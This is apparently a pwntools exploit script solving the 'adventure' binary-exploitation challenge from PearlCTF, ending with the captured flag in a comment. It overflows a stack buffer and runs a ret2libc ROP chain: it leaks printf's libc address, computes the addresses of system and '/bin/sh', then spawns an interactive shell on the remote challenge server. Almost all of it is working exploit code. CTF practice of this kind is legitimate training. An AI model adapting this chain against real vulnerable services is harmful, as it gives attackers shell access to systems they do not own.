#!/bin/python
from pwn import *
exe = ELF('./adventure_patched')
libc = ELF('./libc.so.6')

p = process(exe.path)
p = remote('dyn.ctf.pearlctf.in', 30014)
# context.terminal = ['foot']
# gdb.attach(p, gdbscript='''
#
# b*0x0000000000401267
#            ''')
#################exploiting#####################
pop_rdi = 0x000000000040121e
ret = 0x000000000040129e
printf_ptr = 0x404018
hatch_back = 0x0000000000401227
leave_ret = 0x000000000040129d
p.sendlineafter(b' your choice:',b'2')
p.sendlineafter(b'hatch it?',b'1')
fake_rbp = 0x404190
read_addr = 0x404160
printf_plt = 0x4010c0
gets_plt = 0x4010e0
payload = b''  
payload = payload.ljust(0x28)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(printf_ptr)
payload += p64(printf_plt)
payload += p64(ret)
payload += p64(hatch_back)

p.sendlineafter(b' dragon a name',payload )

p.recvuntil(b'with')
p.recvuntil(b'\x9e\x12@\n')
leak_addr = u64(p.recv(6) + b'\x00\x00')
log.info(f'what i just: ' + hex(leak_addr))
base_libc = leak_addr - 0x80ed0
bin_sh = base_libc + 0x1d8698
system_libc = base_libc + 0x50d60
log.info(f'base libc: ' + hex(base_libc))
log.info(f'bin_sh: ' + hex(bin_sh))
log.info(f'system_libc: ' + hex(system_libc))
payload = b''
payload = payload.ljust(0x28 +0x1)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system_libc)
p.sendlineafter(b'dragon a name',payload)
#pearl{r3s0lv1ng_tr0ubl3s_b3c0m1ng_tr0ubl3h00t3r}
##############the end###########################
p.interactive()
